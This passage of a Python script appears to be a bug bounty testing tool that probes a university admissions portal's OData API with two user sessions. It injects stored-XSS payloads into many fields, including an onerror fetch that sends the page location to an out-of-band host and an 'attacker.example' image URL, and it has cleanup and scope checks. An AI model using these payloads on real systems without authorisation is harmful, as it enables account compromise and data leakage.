                         f"persisted={persisted}"]
                if persisted:
                    flags.append(f"ANOMALY_s11_field_persisted_{field}")
                logger.log("11", ent, "COMPARE", f"{field}={val!r}",
                           {"status": "n/a", "text": ""}, flags)
    finally:
        # restore whatever we may have flipped
        again = m.read_entity(client, sA, ent, logger, "11", "S11 restore-check")
        for field, _ in S11_FIELDS:
            now = m.json_field(again.get("text", ""), field)
            if now != baseline[field]:
                restore_field(client, sA, ent, field, baseline[field], logger, "11")


# ---------------------------------------------------------------------------
# SWEEP 12 — OrganisationCustomisations image/label writes
# ---------------------------------------------------------------------------
def sweep_12(client, sessions, logger):
    sA = sessions["A"]
    sB = sessions["B"]
    inst = "50000050"
    ent = f"OrganisationCustomisations('{inst}')"
    base = m.read_entity(client, sA, ent, logger, "12", "S12 baseline read")
    baseline = gather_row_props(base.get("text", ""))
    _save_baselines("intigriti/kuleuven_admissions/vm-results/03-sweep12-baselines.json",
                    {"A_baseline": baseline})
    logger.log("12", ent, "NOTE", "S12 baseline",
               {"status": "n/a", "text": ""}, [f"fields={list(baseline)}"])
    # Focus on the string-shaped fields we know from Track D
    priority_fields = ["imageLeft", "imageRight", "imageCenter",
                       "organisation", "organisationDescription",
                       "showPhoto", "showCallName", "chatPageEnabled"]
    payload_bank = {
        "url_ext": "http://attacker.example/x.svg",
        "traversal": "../../evil.svg",
        "html_img": "<img src=x onerror=alert(1)>",
        "plain": "KLTEST_S12_plain",
    }
    try:
        for field in priority_fields:
            if field not in baseline:
                continue
            base_val = baseline[field]
            for name, val in payload_bank.items():
                variant = f"S12 MERGE {field}={name}"
                m.merge(client, sA, ent, {field: val}, logger, "12", variant)
                after = m.read_entity(client, sA, ent, logger, "12",
                                      f"S12 re-read {field}={name}")
                now = m.json_field(after.get("text", ""), field)
                persisted = (now == val) and (now != base_val)
                flags = [f"before={base_val!r}", f"after={now!r}",
                         f"persisted={persisted}"]
                if persisted:
                    flags.append("ANOMALY_s12_customisation_persisted")
                logger.log("12", ent, "COMPARE", f"{field}={name}",
                           {"status": "n/a", "text": ""}, flags)
                # cross-user render check
                if persisted:
                    rB = m.read_entity(client, sB, ent, logger, "12",
                                       f"S12 B-session read {field}={name}")
                    bt = rB.get("text", "") or ""
                    logger.log("12", ent, "CROSS-USER-CHECK",
                               f"S12 B sees {field}={name}",
                               {"status": "n/a", "text": ""},
                               [f"marker_in_B={('KLTEST_S12_' in bt or 'attacker.example' in bt or '<img' in bt)}"])
    finally:
        again = m.read_entity(client, sA, ent, logger, "12", "S12 restore-check")
        for field in priority_fields:
            if field not in baseline:
                continue
            now = m.json_field(again.get("text", ""), field)
            if now != baseline[field]:
                restore_field(client, sA, ent, field, baseline[field], logger, "12")


# ---------------------------------------------------------------------------
# SWEEP 13 — missed free-text sinks (extends Sweep 7)
# ---------------------------------------------------------------------------
S13_SINKS = [
    (f"Applications('{m.ACCT['A']['application']}')",
     ["doctSupervisor", "doctCoSupervisor", "doctAanstelDossierProject",
      "doctPhdLanguage",
      "additionalremarks", "additionalRemarks",  # case sensitivity check
     ]),
    ("PersInfos('0')", ["callName"]),
    ("Addresses(inAccountId='0',language='E')",
     ["contPersFirstName", "contPersLastName", "contPersEmail",
      "contPersTelephone", "contPersRelation", "additionalRemarks"]),
    (f"ApplicationStaySet('{m.ACCT['A']['application']}')",
     ["stayAddress.telephone", "stayAddress.box"]),
    (f"Curriculums('0')",
     ["additionalremarks", "eduNameSchool", "eduNameProgram", "eduFinalGrade"]),
    ("HigherEducations('0')", ["nameSchool", "nameProgram", "result"]),
    ("Interrupts('0')", ["interruptedReasonOther"]),
    ("Languages('0')", ["additionalRemarks"]),
    (f"DisciplineSet(applicationId='{m.ACCT['A']['application']}',key='1')",
     ["disciplineCode"]),
    (f"TrefwoordenSet(applicationId='{m.ACCT['A']['application']}',key='1')",
     ["trefwoord"]),
]

def _stored_classifier(val):
    """Verdict on a free-text readback value. Mirrors Sweep 7's classifier."""
    if val is None:
        return "readback_none"
    s = str(val)
    if "<img" in s and "KLXSSPROBE_S13" in s:
        return "stored_RAW"
    if "&lt;img" in s or "&amp;" in s:
        return "stored_encoded"
    if s == "":
        return "stored_stripped_or_empty"
    if "KLXSSPROBE_S13" in s:
        return "stored_marker_only"
    return "unknown"


def sweep_13(client, sessions, logger, oob_host=None):
    sA = sessions["A"]
    payload = "<img src=x onerror=alert(1)>KLXSSPROBE_S13"
    if oob_host:
        payload = (f"<img src=x onerror=fetch('//{oob_host}/?p='+document.location)"
                   f">KLXSSPROBE_S13")
    for entity, fields in S13_SINKS:
        for field in fields:
            variant = f"S13 inject {entity}.{field}"
            try:
                m.merge(client, sA, entity, {field: payload}, logger, "13", variant)
                r = m.read_entity(client, sA, entity, logger, "13",
                                  f"S13 readback {entity}.{field}")
                val = m.json_field(r.get("text", ""), field)
                verdict = _stored_classifier(val)
                flags = [verdict]
                if verdict == "stored_RAW":
                    flags.append("ANOMALY_s13_free_text_stored_raw")
                logger.log("13", entity, "CLASSIFY", f"{field} -> {verdict}",
                           {"status": "n/a", "text": ""}, flags)
            finally:
                # mandatory cleanup to ""
                m.merge(client, sA, entity, {field: ""}, logger, "13",
                        f"S13 CLEANUP {entity}.{field}", extra_flags=["cleanup"])
                v = m.read_entity(client, sA, entity, logger, "13",
                                  f"S13 verify-cleanup {entity}.{field}")
                cleaned = m.json_field(v.get("text", ""), field)
                logger.log("13", entity, "CLEANUP_VERIFY",
                           f"{field} empty={cleaned in ('', None)}",
                           {"status": "n/a", "text": ""},
                           [f"cleanup_ok={cleaned in ('', None)}"])


# ---------------------------------------------------------------------------
# SWEEP 14 — one-GET verifications
# ---------------------------------------------------------------------------
S14_LAZYLOAD_CANDIDATES = [
    "/sap/bc/ui5_ui5/sap/zc_ad_appl/view/ApplicationAttachments.view.xml",
    "/sap/bc/ui5_ui5/sap/zc_ad_appl/controller/ApplicationAttachments.controller.js",
    "/sap/bc/ui5_ui5/sap/zc_ad_appl/fragment/AttachmentType.fragment.xml",
    # additional lazy-load candidates from Track D §8 / i18n orphans:
    "/sap/bc/ui5_ui5/sap/zc_ad_appl/fragment/DoctoralStaff.fragment.xml",
    "/sap/bc/ui5_ui5/sap/zc_ad_appl/fragment/AttachmentDialog.fragment.xml",
    "/sap/bc/ui5_ui5/sap/zc_ad_appl/localService/metadata.xml",
]


def sweep_14(client, sessions, logger):
    sA = sessions["A"]
    # 14.1: lazy-loaded UI5 assets under the same webapp root
    out_dir = "intigriti/kuleuven_admissions/vm-results/03-bundle/lazyloaded"
    os.makedirs(out_dir, exist_ok=True)
    for path in S14_LAZYLOAD_CANDIDATES:
        url = f"https://{m.ALLOWED_HOST}{path}"
        variant = f"S14.1 GET {path}"
        if client.dry_run:
            logger.log("14", path, "GET", variant,
                       {"status": None, "text": "",
                        "planned": {"method": "GET", "url": url}},
                       ["dry-run"])
            continue
        try:
            # bundle_fetch scope is /sap/bc/ui5_ui5/sap/zc_ad_appl/; use raw urllib
            req = urllib.request.Request(url, method="GET",
                                         headers={"Accept": "*/*",
                                                  "Cookie": sA.cookie_header})
            time.sleep(m.MIN_INTERVAL)
            try:
                resp = urllib.request.urlopen(req, timeout=30)
                status = resp.getcode()
                body = resp.read(400_000)
            except urllib.error.HTTPError as e:
                status = e.code
                body = e.read() if e.fp else b""
            logger.log("14", path, "GET", variant,
                       {"status": status, "text": ""},
                       [f"status={status}", f"len={len(body)}"])
            if status == 200 and len(body):
                name = os.path.basename(path)
                with open(f"{out_dir}/{name}", "wb") as fh:
                    fh.write(body)
        except Exception as e:
            logger.log("14", path, "GET-ERR", variant,
                       {"status": "ERR", "text": str(e)[:100]}, [])

    # 14.2: $metadata over-exposure enumeration
    r = client.request(sA, "GET", "$metadata",
                       extra_headers={"Accept": "application/xml"},
                       note="S14.2 $metadata for over-exposure")
    txt = r.get("text", "") or ""
    if txt:
        with open(f"{out_dir}/metadata.xml", "w", encoding="utf-8") as fh:
            fh.write(txt)
        entities = _parse_metadata_entities(txt)
        logger.log("14", "$metadata", "GET", "S14.2 metadata parsed", r,
                   [f"entities={len(entities)}",
                    f"total_props={sum(len(v) for v in entities.values())}"])
        # dump the entity → property map next to the metadata for the writeup
        with open(f"{out_dir}/entities.json", "w") as fh:
            json.dump(entities, fh, indent=2)


def _parse_metadata_entities(xml_text):
    """Return {entity_name: [property_names…]}."""
    out = {}
    for et in re.finditer(
            r'<EntityType\s+[^>]*Name="([A-Za-z0-9_]+)"[^>]*>(.*?)</EntityType>',
            xml_text, re.S | re.I):
        name = et.group(1)
        props = [pm.group(1) for pm in re.finditer(
                r'<Property\s+[^>]*Name="([A-Za-z0-9_]+)"', et.group(2))]
        out[name] = props
    return out


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
SWEEPS = {
    "9": sweep_9, "10": sweep_10, "11": sweep_11,
    "12": sweep_12, "13": sweep_13, "14": sweep_14,
}


def main(argv=None):
    ap = argparse.ArgumentParser(description="KU Leuven Track E sweeps 9-14")
    ap.add_argument("--sweeps", default="9",
                    help="comma list of sweeps to run (default: 9)")
    ap.add_argument("--append", action="store_true",
                    help="append rows to existing 02-authz-matrix.jsonl")
    ap.add_argument("--dry-run", action="store_true",
                    help="plan requests only; no network calls")
    ap.add_argument("--check", action="store_true",
                    help="pre-flight reachability + session probes and exit")
    ap.add_argument("--oob-host", default=None,
                    help="interactsh (or similar) host used ONLY in sweep 9.7")
    args = ap.parse_args(argv)

    selected = [s.strip() for s in args.sweeps.split(",") if s.strip()]
    for s in selected:
        if s not in SWEEPS:
            raise SystemExit(f"unknown sweep: {s}")

    client = m.Client(dry_run=args.dry_run)
    logger = m.MatrixLogger(m.JSONL_PATH, dry_run=args.dry_run,
                            append=args.append)

    if args.dry_run:
        sessions = {"A": m.Session("A", "dry=run"), "B": m.Session("B", "dry=run")}
        for s in sessions.values():
            s.csrf = "<dry-run-token>"
        print("[DRY-RUN] planning Track E requests — no network calls.", file=sys.stderr)
    else:
        try:
            sessions = m.load_sessions(client)
        except SystemExit as e:
            raise
        print(f"[LIVE] sessions loaded: {list(sessions)}", file=sys.stderr)

    if args.check:
        for label, s in sessions.items():
            try:
                r = client.request(s, "GET",
                                   f"Applications('{m.ACCT[label]['application']}')",
                                   note=f"pre-flight {label}")
                print(f"  {label}: status={r.get('status')}  "
                      f"len={len(r.get('text',''))}", file=sys.stderr)
            except m.SessionExpired as e:
                print(f"  {label}: SESSION EXPIRED — {e}", file=sys.stderr)
                return 2
        return 0

    halted = None
    for s in selected:
        print(f"\n=== TRACK E SWEEP {s} ===", file=sys.stderr)
        try:
            if s in ("9", "13"):
                SWEEPS[s](client, sessions, logger, oob_host=args.oob_host)
            else:
                SWEEPS[s](client, sessions, logger)
        except m.SessionExpired as e:
            halted = f"SESSION EXPIRED during sweep {s}: {e}"
            print(f"[HALT] {halted}", file=sys.stderr)
            break
        except m.ScopeViolation as e:
            halted = f"SCOPE VIOLATION during sweep {s}: {e}"
            print(f"[FATAL] {halted}", file=sys.stderr)
            break
        except m.ImmediateStop as e:
            logger.log(s, "IMMEDIATE-STOP", "-", str(e),
                       {"status": "IMMEDIATE-STOP", "text": ""}, ["IMMEDIATE_STOP"])
            print(f"[IMMEDIATE-STOP] sweep {s}: {e}", file=sys.stderr)

    if not args.dry_run:
        m.build_summary()
    print(f"\nWrote {'plan' if args.dry_run else 'matrix'}: "
          f"{m.PLAN_PATH if args.dry_run else m.JSONL_PATH}", file=sys.stderr)
    if halted:
        print(f"\n{halted}", file=sys.stderr)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
